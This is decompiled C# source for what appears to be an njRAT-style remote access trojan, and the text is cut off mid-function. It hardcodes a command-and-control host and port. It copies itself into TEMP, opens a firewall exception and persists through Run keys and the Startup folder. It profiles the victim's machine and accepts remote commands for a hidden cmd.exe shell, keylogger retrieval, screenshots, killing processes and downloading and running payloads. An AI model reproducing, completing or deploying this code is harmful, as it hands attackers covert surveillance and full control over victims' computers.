using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using ClassLibrary1;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

[StandardModule]
internal sealed class Class0
{
	public static string string_0 = "SGFjS2Vk";

	public static string string_1 = "0.6.4";

	public static Mutex mutex_0 = null;

	public static string string_2 = "dwe.exe";

	public static string string_3 = "TEMP";

	public static string string_4 = "a4cec9de4b3a29bedcdd073c68278828";

	public static string string_5 = "habib00.no-ip.biz";

	public static string string_6 = "1177";

	public static string string_7 = "|'|'|";

	public static bool bool_0 = Conversions.ToBoolean("True");

	public static bool bool_1 = Conversions.ToBoolean("True");

	public static bool bool_2 = Conversions.ToBoolean("True");

	public static bool bool_3 = Conversions.ToBoolean("True");

	public static FileInfo fileInfo_0 = new FileInfo(Application.get_ExecutablePath());

	public static FileStream fileStream_0;

	public static Computer computer_0 = new Computer();

	public static string string_8 = "[endof]";

	public static kl kl_0 = null;

	private static Process process_0;

	public static bool bool_4 = false;

	public static string string_9 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	public static TcpClient tcpClient_0 = null;

	private static MemoryStream memoryStream_0 = new MemoryStream();

	private static byte[] byte_0 = new byte[5121];

	private static string string_10 = "";

	[DllImport("psapi")]
	public static extern bool EmptyWorkingSet(long long_0);

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, int int_4);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long long_0);

	public static void smethod_0(string string_11)
	{
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + string_4, writable: true)!.DeleteValue(string_11);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string smethod_1(string string_11)
	{
		try
		{
			return Conversions.ToString(((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + string_4)!.GetValue(string_11, ""));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_2(string string_11, string string_12)
	{
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + string_4)
				.SetValue(string_11, string_12);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_3()
	{
		string text = "lv" + string_7;
		try
		{
			if (Operators.CompareString(smethod_1("vn"), "", false) == 0)
			{
				string text2 = text;
				string string_ = smethod_6(ref string_0) + "_" + smethod_14();
				text = text2 + smethod_5(ref string_) + string_7;
			}
			else
			{
				string text3 = text;
				string string_ = smethod_1("vn");
				string string_2 = smethod_6(ref string_) + "_" + smethod_14();
				text = text3 + smethod_5(ref string_2) + string_7;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string string_2 = smethod_14();
			text = text4 + smethod_5(ref string_2) + string_7;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + string_7;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + string_7;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + string_7;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + string_7;
			ProjectData.ClearProjectError();
		}
		text = text + smethod_4() + string_7;
		text = text + "" + string_7;
		try
		{
			text += ((ServerComputer)computer_0).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text += "??";
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += "0";
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + string_7) : (text + " x64" + string_7));
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			text += string_7;
			ProjectData.ClearProjectError();
		}
		text = ((!smethod_12()) ? (text + "No" + string_7) : (text + "Yes" + string_7));
		text = text + string_1 + string_7;
		text = text + ".." + string_7;
		text = text + smethod_13() + string_7;
		string text5 = "";
		try
		{
			string[] valueNames = ((ServerComputer)computer_0).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + string_4, RegistryKeyPermissionCheck.Default)
				.GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	public static string smethod_4()
	{
		try
		{
			return fileInfo_0.LastWriteTime.ToString("yyyy-MM-dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "unknown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_5(ref string string_11)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_11);
		return Convert.ToBase64String(bytes);
	}

	public static string smethod_6(ref string string_11)
	{
		byte[] bytes = Convert.FromBase64String(string_11);
		return Encoding.UTF8.GetString(bytes);
	}

	public static string smethod_7(int int_0)
	{
		VBMath.Randomize();
		Random random = new Random();
		string text = "";
		string text2 = "abcdefghijklmnopqrstuvwxyz";
		for (int i = 1; i <= int_0; i = checked(i + 1))
		{
			text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
		}
		return text;
	}

	public static byte[] smethod_8(ref string string_11)
	{
		return Encoding.Default.GetBytes(string_11);
	}

	public static string smethod_9(ref byte[] byte_1)
	{
		return Encoding.Default.GetString(byte_1);
	}

	public static Array smethod_10(byte[] byte_1, string string_11)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(smethod_9(ref byte_1), string_11, -1, (CompareMethod)0);
		memoryStream.Write(byte_1, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(byte_1, array[0].Length + string_11.Length, byte_1.Length - (array[0].Length + string_11.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	public static byte[] smethod_11(byte[] byte_1, ref bool bool_5)
	{
		checked
		{
			if (bool_5)
			{
				MemoryStream memoryStream = new MemoryStream();
				GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true);
				gZipStream.Write(byte_1, 0, byte_1.Length);
				gZipStream.Dispose();
				memoryStream.Position = 0L;
				byte[] array = new byte[(int)memoryStream.Length + 1];
				memoryStream.Read(array, 0, array.Length);
				memoryStream.Dispose();
				return array;
			}
			MemoryStream memoryStream2 = new MemoryStream(byte_1);
			GZipStream gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
			byte[] array2 = new byte[4];
			memoryStream2.Position = memoryStream2.Length - 5L;
			memoryStream2.Read(array2, 0, 4);
			int num = BitConverter.ToInt32(array2, 0);
			memoryStream2.Position = 0L;
			byte[] array3 = new byte[num - 1 + 1];
			gZipStream2.Read(array3, 0, num);
			gZipStream2.Dispose();
			memoryStream2.Dispose();
			return array3;
		}
	}

	public static bool smethod_12()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					short short_ = (short)num;
					string string_ = Strings.Space(100);
					string string_2 = null;
					if (!capGetDriverDescriptionA(short_, ref string_, 100, ref string_2, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static string smethod_13()
	{
		checked
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					string string_ = " ";
					return smethod_5(ref string_);
				}
				int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
				string string_2 = Strings.StrDup(windowTextLengthA + 1, "*");
				GetWindowTextA(foregroundWindow, ref string_2, windowTextLengthA + 1);
				int int_ = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref int_);
				if (int_ != 0)
				{
					try
					{
						string string_ = Process.GetProcessById(int_).MainWindowTitle;
						return smethod_5(ref string_);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						string result = smethod_5(ref string_2);
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return smethod_5(ref string_2);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string string_ = " ";
				string result = smethod_5(ref string_);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string smethod_14()
	{
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = default(int);
			GetVolumeInformationA(ref string_, ref string_2, 0, ref int_3, ref int_, ref int_2, ref string_3, 0);
			return Conversion.Hex(int_3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_15(byte[] byte_1, string string_11)
	{
		Assembly assembly = Assembly.Load(byte_1);
		Module[] modules = assembly.GetModules();
		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + string_11))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static void smethod_16()
	{
		smethod_24(0);
	}

	private static bool smethod_17(FileInfo fileInfo_1, FileInfo fileInfo_2)
	{
		if (Operators.CompareString(fileInfo_1.get_Name().ToLower(), fileInfo_2.get_Name().ToLower(), false) != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = fileInfo_1.Directory;
		DirectoryInfo directoryInfo2 = fileInfo_2.Directory;
		do
		{
			if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	public static void smethod_18()
	{
		if (bool_1 && !smethod_17(fileInfo_0, new FileInfo(Interaction.Environ(string_3).ToLower() + "\\" + string_2.ToLower())))
		{
			try
			{
				if (File.Exists(Interaction.Environ(string_3) + "\\" + string_2))
				{
					File.Delete(Interaction.Environ(string_3) + "\\" + string_2);
				}
				File.Copy(fileInfo_0.FullName, Interaction.Environ(string_3) + "\\" + string_2, overwrite: true);
				Process.Start(Interaction.Environ(string_3) + "\\" + string_2);
				ProjectData.EndApp();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall add allowedprogram \"" + fileInfo_0.FullName + "\" \"" + fileInfo_0.get_Name() + "\" ENABLE", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		if (bool_3)
		{
			try
			{
				((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey(string_9, writable: true)!.SetValue(string_4, "\"" + fileInfo_0.FullName + "\" ..");
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)computer_0).get_Registry().get_LocalMachine().OpenSubKey(string_9, writable: true)!.SetValue(string_4, "\"" + fileInfo_0.FullName + "\" ..");
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_2)
		{
			try
			{
				File.Copy(fileInfo_0.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_4 + ".exe", overwrite: true);
				fileStream_0 = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_4 + ".exe", FileMode.Open);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		Thread.Sleep(1000);
	}

	private static void smethod_19(object object_0, object object_1)
	{
		try
		{
			string text = string_7;
			string string_ = Conversions.ToString(NewLateBinding.LateGet(object_1, (Type)null, "Data", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text2 = smethod_5(ref string_);
			NewLateBinding.LateSetComplex(object_1, (Type)null, "Data", new object[1] { string_ }, (string[])null, (Type[])null, true, false);
			smethod_26("rs" + text + text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_20()
	{
		try
		{
			smethod_26("rsc");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_21(byte[] byte_1)
	{
		//IL_104b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1052: Expected O, but got Unknown
		string[] array = Strings.Split(smethod_9(ref byte_1), string_7, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "proc":
					switch (array[1])
					{
					case "~":
					{
						smethod_26("proc" + string_7 + "pid" + string_7 + Conversions.ToString(Process.GetCurrentProcess().Id));
						Process[] processes = Process.GetProcesses();
						smethod_26("proc" + string_7 + "~" + string_7 + Conversions.ToString(processes.Length));
						int num5 = 0;
						string text13 = "";
						Process[] array4 = processes;
						foreach (Process process in array4)
						{
							num5++;
							try
							{
								try
								{
									string text14 = "";
									try
									{
										string string_ = process.MainModule!.FileVersionInfo.FileDescription;
										text14 = smethod_5(ref string_);
									}
									catch (Exception projectError11)
									{
										ProjectData.SetProjectError(projectError11);
										ProjectData.ClearProjectError();
									}
									text13 = text13 + string_7 + Conversions.ToString(process.Id) + "," + process.MainModule!.FileName + "," + text14;
								}
								catch (Exception projectError12)
								{
									ProjectData.SetProjectError(projectError12);
									string[] array5 = new string[7]
									{
										text13,
										string_7,
										Conversions.ToString(process.Id),
										",",
										process.MainModule!.FileVersionInfo.FileName,
										",",
										null
									};
									string[] array6 = array5;
									string string_ = process.MainModule!.FileVersionInfo.FileDescription;
									array6[6] = smethod_5(ref string_);
									text13 = string.Concat(array5);
									ProjectData.ClearProjectError();
								}
							}
							catch (Exception projectError13)
							{
								ProjectData.SetProjectError(projectError13);
								string text15 = "";
								try
								{
									string string_ = FileVersionInfo.GetVersionInfo(Interaction.Environ("windir") + "\\system32\\" + process.ProcessName + ".exe").FileDescription;
									text15 = smethod_5(ref string_);
								}
								catch (Exception projectError14)
								{
									ProjectData.SetProjectError(projectError14);
									ProjectData.ClearProjectError();
								}
								if (File.Exists(Interaction.Environ("windir") + "\\system32\\" + process.ProcessName + ".exe"))
								{
									FileInfo fileInfo = new FileInfo(Interaction.Environ("windir") + "\\system32\\" + process.ProcessName + ".exe");
									text13 = text13 + string_7 + Conversions.ToString(process.Id) + "," + fileInfo.FullName + "," + text15;
								}
								else
								{
									text13 = text13 + string_7 + Conversions.ToString(process.Id) + "," + process.ProcessName + "," + text15;
								}
								ProjectData.ClearProjectError();
							}
							if (num5 == 10)
							{
								num5 = 0;
								Thread thread = new Thread(delegate(object object_0)
								{
									smethod_26(Conversions.ToString(object_0));
								}, 1);
								thread.Start("proc" + string_7 + "!" + text13);
								text13 = "";
							}
						}
						if (Operators.CompareString(text13, "", false) != 0)
						{
							smethod_26("proc" + string_7 + "!" + text13);
						}
						break;
					}
					case "k":
					{
						int num3 = array.Length - 1;
						for (int l = 2; l <= num3; l++)
						{
							try
							{
								Process.GetProcessById(Conversions.ToInteger(array[l])).Kill();
								smethod_26("proc" + string_7 + "RM" + string_7 + array[l]);
							}
							catch (Exception ex3)
							{
								ProjectData.SetProjectError(ex3);
								Exception ex4 = ex3;
								smethod_26("proc" + string_7 + "ER" + string_7 + ex4.Message);
								ProjectData.ClearProjectError();
							}
						}
						break;
					}
					case "kd":
					{
						int num4 = array.Length - 1;
						for (int m = 2; m <= num4; m++)
						{
							try
							{
								string text12 = "";
								Process processById2 = Process.GetProcessById(Conversions.ToInteger(array[m]));
								try
								{
									text12 = processById2.MainModule!.FileVersionInfo.FileName;
								}
								catch (Exception projectError9)
								{
									ProjectData.SetProjectError(projectError9);
									try
									{
										text12 = processById2.MainModule!.FileName;
									}
									catch (Exception projectError10)
									{
										ProjectData.SetProjectError(projectError10);
										ProjectData.ClearProjectError();
									}
									ProjectData.ClearProjectError();
								}
								processById2.Kill();
								smethod_26("proc" + string_7 + "RM" + string_7 + array[m]);
								processById2 = null;
								Thread.Sleep(2000);
								File.Delete(text12);
								smethod_26("proc" + string_7 + "ER" + string_7 + "Deleted " + text12);
							}
							catch (Exception ex5)
							{
								ProjectData.SetProjectError(ex5);
								Exception ex6 = ex5;
								smethod_26("proc" + string_7 + "ER" + string_7 + ex6.Message);
								ProjectData.ClearProjectError();
							}
						}
						break;
					}
					case "re":
					{
						int num2 = array.Length - 1;
						for (int k = 2; k <= num2; k++)
						{
							try
							{
								string text11 = "";
								Process processById = Process.GetProcessById(Conversions.ToInteger(array[k]));
								try
								{
									text11 = processById.MainModule!.FileVersionInfo.FileName;
								}
								catch (Exception projectError7)
								{
									ProjectData.SetProjectError(projectError7);
									try
									{
										text11 = processById.MainModule!.FileName;
									}
									catch (Exception projectError8)
									{
										ProjectData.SetProjectError(projectError8);
										text11 = Interaction.Environ("windir") + "\\system32\\" + processById.ProcessName + ".exe";
										ProjectData.ClearProjectError();
									}
									ProjectData.ClearProjectError();
								}
								processById.Kill();
								smethod_26("proc" + string_7 + "RM" + string_7 + array[k]);
								processById = null;
								Process.Start(text11);
								smethod_26("proc" + string_7 + "ER" + string_7 + "Started " + text11);
							}
							catch (Exception ex)
							{
								ProjectData.SetProjectError(ex);
								Exception ex2 = ex;
								smethod_26("proc" + string_7 + "ER" + string_7 + ex2.Message);
								ProjectData.ClearProjectError();
							}
						}
						break;
					}
					}
					break;
				case "rss":
					try
					{
						process_0.Kill();
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					process_0 = new Process();
					process_0.StartInfo.RedirectStandardOutput = true;
					process_0.StartInfo.RedirectStandardInput = true;
					process_0.StartInfo.RedirectStandardError = true;
					process_0.StartInfo.FileName = "cmd.exe";
					process_0.OutputDataReceived += smethod_19;
					process_0.ErrorDataReceived += smethod_19;
					process_0.Exited += delegate
					{
						smethod_20();
					};
					process_0.StartInfo.UseShellExecute = false;
					process_0.StartInfo.CreateNoWindow = true;
					process_0.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process_0.EnableRaisingEvents = true;
					smethod_26("rss");
					process_0.Start();
					process_0.BeginErrorReadLine();
					process_0.BeginOutputReadLine();
					break;
				case "rs":
					process_0.StandardInput.WriteLine(smethod_6(ref array[1]));
					break;
				case "rsc":
					try
					{
						process_0.Kill();
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						ProjectData.ClearProjectError();
					}
					process_0 = null;
					break;
				case "kl":
					smethod_26("kl" + string_7 + smethod_5(ref kl_0.Logs));
					break;
				case "inf":
				{
					string text7 = "inf" + string_7;
					if (Operators.CompareString(smethod_1("vn"), "", false) == 0)
					{
						string text8 = text7;
						string string_ = smethod_6(ref string_0) + "_" + smethod_14();
						text7 = text8 + smethod_5(ref string_) + string_7;
					}
					else
					{
						string text9 = text7;
						string string_ = smethod_1("vn");
						string string_2 = smethod_6(ref string_) + "_" + smethod_14();
						text7 = text9 + smethod_5(ref string_2) + string_7;
					}
					text7 = text7 + string_5 + ":" + string_6 + string_7;
					text7 = text7 + string_3 + string_7;
					text7 = text7 + Class0.string_2 + string_7;
					text7 += Process.GetCurrentProcess().ProcessName;
					smethod_26(text7);
					break;
				}
				case "prof":
					switch (array[1])
					{
					case "~":
						smethod_2(array[2], array[3]);
						break;
					case "!":
						smethod_2(array[2], array[3]);
						smethod_26("getvalue" + string_7 + array[1] + string_7 + smethod_1(array[1]));
						break;
					case "@":
						smethod_0(array[2]);
						break;
					}
					break;
				case "rn":
				{
					byte[] array3 = null;
					if (!array[2].ToLower().StartsWith("http"))
					{
						try
						{
							byte[] byte_3 = Convert.FromBase64String(array[2]);
							bool bool_ = false;
							array3 = smethod_11(byte_3, ref bool_);
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							smethod_26("MSG" + string_7 + "Execute ERROR");
							smethod_26("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					else
					{
						WebClient webClient2 = new WebClient();
						try
						{
							array3 = webClient2.DownloadData(array[2]);
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							smethod_26("MSG" + string_7 + "Download ERROR");
							smethod_26("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					smethod_26("bla");
					string text6 = Interaction.Environ("temp") + "\\" + smethod_7(10) + "." + array[1];
					File.WriteAllBytes(text6, array3);
					Process.Start(text6);
					smethod_26("MSG" + string_7 + "Executed As " + new FileInfo(text6).get_Name());
					break;
				}
				case "inv":
				{
					smethod_26("bla");
					string text16 = smethod_1(array[1]);
					byte[] array7;
					if (text16.Length > 0)
					{
						array7 = Convert.FromBase64String(text16);
						smethod_26("pl" + string_7 + array[1] + string_7 + Conversions.ToString(0));
					}
					else
					{
						if (array[3].Length == 1)
						{
							smethod_26("pl" + string_7 + array[1] + string_7 + "False");
							break;
						}
						byte[] byte_4 = Convert.FromBase64String(array[3]);
						bool bool_ = false;
						array7 = smethod_11(byte_4, ref bool_);
						if (Conversions.ToBoolean(smethod_2(array[1], Convert.ToBase64String(array7))))
						{
							smethod_26("pl" + string_7 + array[1] + string_7 + Conversions.ToString(0));
						}
					}
					object objectValue = RuntimeHelpers.GetObjectValue(smethod_15(array7, "A"));
					NewLateBinding.LateSet(objectValue, (Type)null, "h", new object[1] { string_5 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, "p", new object[1] { string_6 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(Operators.OrObject((object)(!bool_4), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
					{
						Thread.Sleep(1);
					}
					NewLateBinding.LateSet(objectValue, (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
					break;
				}
				case "ret":
				{
					smethod_26("bla");
					string text17 = smethod_1(array[1]);
					byte[] array8;
					if (text17.Length > 0)
					{
						array8 = Convert.FromBase64String(text17);
						smethod_26("pl" + string_7 + array[1] + string_7 + Conversions.ToString(0));
					}
					else
					{
						if (array[2].Length == 1)
						{
							smethod_26("pl" + string_7 + array[1] + string_7 + "True");
							break;
						}
						byte[] byte_5 = Convert.FromBase64String(array[2]);
						bool bool_ = false;
						array8 = smethod_11(byte_5, ref bool_);
						if (Conversions.ToBoolean(smethod_2(array[1], Convert.ToBase64String(array8))))
						{
							smethod_26("pl" + string_7 + array[1] + string_7 + Conversions.ToString(0));
						}
					}
					object objectValue2 = RuntimeHelpers.GetObjectValue(smethod_15(array8, "A"));
					string[] array5 = new string[5]
					{
						"ret",
						string_7,
						array[1],
						string_7,
						null
					};
					string[] array9 = array5;
					string string_2 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
					array9[4] = smethod_5(ref string_2);
					smethod_26(string.Concat(array5));
					break;
				}
				case "CAP":
				{
					int width = Screen.get_PrimaryScreen().get_Bounds().Width;
					Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(width, rectangle.Height);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
					val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					try
					{
						Cursor @default = Cursors.get_Default();
						Point position = Cursor.get_Position();
						size = new Size(32, 32);
						rectangle = new Rectangle(position, size);
						@default.Draw(val2, rectangle);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					val2.Dispose();
					MemoryStream memoryStream = new MemoryStream();
					string string_2 = "CAP" + string_7;
					byte_1 = smethod_8(ref string_2);
					memoryStream.Write(byte_1, 0, byte_1.Length);
					MemoryStream memoryStream2 = new MemoryStream();
					IntPtr intPtr = default(IntPtr);
					((Image)val).GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream2, ImageFormat.get_Jpeg());
					string text10 = smethod_22(memoryStream2.ToArray());
					if (Operators.CompareString(text10, string_10, false) != 0)
					{
						string_10 = text10;
						memoryStream.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
					}
					else
					{
						memoryStream.WriteByte(0);
					}
					smethod_25(memoryStream.ToArray());
					memoryStream.Dispose();
					memoryStream2.Dispose();
					((Image)val).Dispose();
					break;
				}
				case "P":
					smethod_26("P");
					break;
				case "un":
					switch (array[1])
					{
					case "~":
						smethod_29();
						break;
					case "!":
						smethod_24(0);
						ProjectData.EndApp();
						break;
					case "@":
						smethod_24(0);
						Process.Start(fileInfo_0.FullName);
						ProjectData.EndApp();
						break;
					}
					break;
				case "up":
				{
					byte[] array2 = null;
					if (!array[1].ToLower().StartsWith("http"))
					{
						try
						{
							byte[] byte_2 = Convert.FromBase64String(array[1]);
							bool bool_ = false;
							array2 = smethod_11(byte_2, ref bool_);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							smethod_26("MSG" + string_7 + "Update ERROR");
							smethod_26("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					else
					{
						WebClient webClient = new WebClient();
						try
						{
							array2 = webClient.DownloadData(array[1]);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							smethod_26("MSG" + string_7 + "Update ERROR");
							smethod_26("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					smethod_26("bla");
					((ServerComputer)computer_0).get_Registry().get_CurrentUser().SetValue("di", "");
					string text5 = Interaction.Environ("temp") + "\\" + smethod_7(10) + ".exe";
					File.WriteAllBytes(text5, array2);
					smethod_26("MSG" + string_7 + "Updating To " + new FileInfo(text5).get_Name());
					Process.Start(text5, "UP:" + Conversions.ToString(Process.GetCurrentProcess().Id));
					int num = 0;
					do
					{
						Thread.Sleep(10);
						if (Operators.ConditionalCompareObjectEqual(((ServerComputer)computer_0).get_Registry().get_CurrentUser().GetValue("di", ""), (object)"!", false))
						{
							smethod_29();
						}
						num++;
					}
					while (num <= 500);
					break;
				}
				case "RG":
				{
					RegistryKey registryKey = smethod_23(array[2]);
					switch (array[1])
					{
					case "~":
					{
						string text = "RG" + string_7 + "~" + string_7 + array[2] + string_7;
						string text2 = "";
